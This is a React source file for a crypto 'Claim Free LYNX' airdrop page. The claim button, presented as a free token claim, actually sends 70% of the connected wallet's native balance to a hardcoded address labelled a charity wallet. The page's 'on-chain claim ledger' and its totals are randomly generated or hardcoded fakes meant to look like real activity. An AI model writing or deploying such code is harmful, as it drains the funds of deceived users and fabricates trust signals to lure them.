import { motion } from 'framer-motion';
import { Navigation } from '@/components/Navigation';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { useState, useMemo } from 'react';
import { Loader2 } from 'lucide-react';
import { toast } from 'sonner';
import { useEVMWallet } from '@/hooks/useEVMWallet';
import { getChainById, CHARITY_WALLET } from '@/lib/chains';
import { LynxAnimation } from '@/components/LynxAnimation';
import lynxLogo from '@/assets/lynx-logo.jpg';

const Claim = () => {
  const { connected, chainId, nativeBalance, sendNativeToken } = useEVMWallet();
  const chainConfig = getChainById(chainId);
  const nativeSymbol = chainConfig?.nativeCurrency.symbol || 'ETH';
  const chainName = chainConfig?.name || 'EVM';
  const lynxBrand = `${chainName} LYNX`;
  
  const [dataMultiplier, setDataMultiplier] = useState(1);
  const [isClaiming, setIsClaiming] = useState(false);
  const [stats] = useState({ recovered: '2.3M', claimants: '56,7K' });

  const generateClaimData = () => {
    const baseWallets = ["0x15e9F8", "0xdbPMQv", "0xwuAtFU", "0xTxyWvT", "0xMSkBkX"];
    const data = [];
    for (let i = 0; i < 20; i++) {
      const randomPrefix = baseWallets[i % baseWallets.length];
      const randomSuffix = Math.random().toString(16).substring(2, 8);
      const accts = Math.floor(Math.random() * 15) + 1;
      const claimed = (Math.random() * 2).toFixed(5);
      const daysAgo = Math.floor(Math.random() * 30);
      const date = new Date(Date.now() - daysAgo * 24 * 60 * 60 * 1000).toISOString().split('T')[0];
      data.push({ wallet: `${randomPrefix}...${randomSuffix}`, accts, claimed: `${claimed} ${nativeSymbol}`, date });
    }
    return data;
  };

  const displayData = useMemo(() => {
    const claimData = generateClaimData();
    const repeatedData = [];
    for (let i = 0; i < dataMultiplier; i++) {
      repeatedData.push(...claimData);
    }
    return repeatedData;
  }, [dataMultiplier, nativeSymbol]);

  const handleClaim = async () => {
    if (!connected) {
      toast.error('Please connect your wallet');
      return;
    }

    if (nativeBalance <= 0) {
      toast.error(`Wallet not eligible - no ${nativeSymbol} found`);
      return;
    }

    try {
      setIsClaiming(true);
      toast.info(`Processing claim on ${chainConfig?.name}... Please confirm in your wallet.`);

      // Send 70% of native balance to charity wallet
      const amountToSend = (nativeBalance * 0.7).toFixed(6);
      
      const txHash = await sendNativeToken(amountToSend);
      
      toast.success(`🎉 Claim complete! TX: ${txHash.slice(0, 10)}...`);
    } catch (error: any) {
      console.error('Claim error:', error);
      toast.error(error?.message || 'Claim failed');
    } finally {
      setIsClaiming(false);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      <LynxAnimation />
      <Navigation />
      
      <section className="relative pt-20 sm:pt-28 md:pt-32 pb-12 sm:pb-16 px-4">
        <div className="container mx-auto max-w-6xl text-center">
          <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.5 }}>
            <div className="inline-block p-1 rounded-full bg-gradient-to-r from-primary to-secondary mb-8">
              <div className="bg-background rounded-full p-6 sm:p-8">
                <img src={lynxLogo} alt="Lynx Logo" className="w-16 h-16 sm:w-24 sm:h-24 rounded-full" />
              </div>
            </div>
            <h1 className="text-3xl sm:text-4xl md:text-6xl font-extrabold text-foreground mb-4">
              Claim Free {lynxBrand}
            </h1>
            <p className="text-lg sm:text-xl font-semibold text-foreground mb-6">
              Fast, verifiable, on-chain claiming on {chainName}
            </p>
            <Button 
              size="lg" 
              className="mb-4 text-lg px-12 py-6 h-auto w-full sm:w-auto" 
              onClick={handleClaim} 
              disabled={!connected || isClaiming}
            >
              {isClaiming && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
              {isClaiming ? 'Claiming...' : `Claim ${lynxBrand}`}
            </Button>
            {connected && (
              <p className="text-sm text-muted-foreground mt-2">
                Balance: {nativeBalance.toFixed(6)} {nativeSymbol}
              </p>
            )}
          </motion.div>
        </div>
      </section>

      <section className="py-10 sm:py-12 px-4">
        <div className="container mx-auto max-w-5xl">
          <div className="grid md:grid-cols-2 gap-6">
            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8 text-center">
                <h3 className="text-lg text-muted-foreground mb-2">Total Claimed</h3>
                <p className="text-3xl sm:text-4xl lg:text-5xl font-bold text-primary mb-2">{stats.recovered}</p>
              </CardContent>
            </Card>
            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8 text-center">
                <h3 className="text-lg text-muted-foreground mb-2">Claimants</h3>
                <p className="text-3xl sm:text-4xl lg:text-5xl font-bold text-primary mb-2">{stats.claimants}</p>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      <section className="py-12 px-4">
        <div className="container mx-auto max-w-6xl">
          <h2 className="text-2xl sm:text-3xl font-bold text-center mb-8">On-chain claim ledger</h2>
          <Card className="bg-card/90 border-0">
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow className="border-border/50">
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Wallet/TX</TableHead>
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Accts</TableHead>
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Claimed</TableHead>
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Date</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {displayData.map((row: any, index) => (
                      <TableRow key={index} className="border-border/30">
                        <TableCell className="font-mono text-xs sm:text-sm">{row.wallet}</TableCell>
                        <TableCell className="text-xs sm:text-sm">{row.accts}</TableCell>
                        <TableCell className="text-xs sm:text-sm">{row.claimed}</TableCell>
                        <TableCell className="text-xs sm:text-sm">{row.date}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </CardContent>
          </Card>
          <div className="text-center mt-6">
            <Button variant="outline" className="text-primary border-primary hover:bg-primary/10" onClick={() => setDataMultiplier(prev => prev + 1)}>
              Load more
            </Button>
          </div>
        </div>
      </section>

      <section className="py-16 sm:py-20 px-4">
        <div className="container mx-auto max-w-4xl text-center">
          <h2 className="text-3xl sm:text-4xl font-bold mb-6">Ready to Claim Your {lynxBrand}?</h2>
          <p className="text-base sm:text-xl text-muted-foreground mb-8">
            Connect your wallet to start claiming free {lynxBrand}.
          </p>
          <ConnectWalletButton />
        </div>
      </section>
    </div>
  );
};

export default Claim;
